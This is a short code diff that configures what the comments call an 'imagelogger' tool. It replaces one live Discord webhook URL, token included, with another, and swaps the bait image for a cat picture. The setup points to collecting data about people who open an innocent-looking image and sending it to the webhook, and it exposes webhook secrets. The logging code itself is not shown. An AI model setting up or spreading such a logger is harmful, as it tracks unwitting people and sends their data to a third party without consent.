@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1505344247484911668/zqzkqhurWnTASVMyMxAx2ph0COxzvSeJ5zQyQkZi_Bmf6HPtz-_wJcWpoeVN_d_Ov-fk",
-    "image": "https://imgs.search.brave.com/ekIh2wUOy4cYH88Ag0mJcCnznRGplmdSuprH6kXG164/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly90My5m/dGNkbi5uZXQvanBn/LzA4LzMyLzI1LzI2/LzM2MF9GXzgzMjI1/MjYwOF9BajZlMzhN/Q2prZjZYd3Bwa0xD/UkxVa0F6Ym5wYnl3/SS5qcGc", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1505366262543548576/bQUDkT2-awDKm0IDw661z-OQQYpqXELSLU4bxA1zTK9R00m114h4YLareTDHoV1BzlRu",
+    "image": "https://ar.wikiversity.org/wiki/%D9%85%D9%84%D9%81:Cat03.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
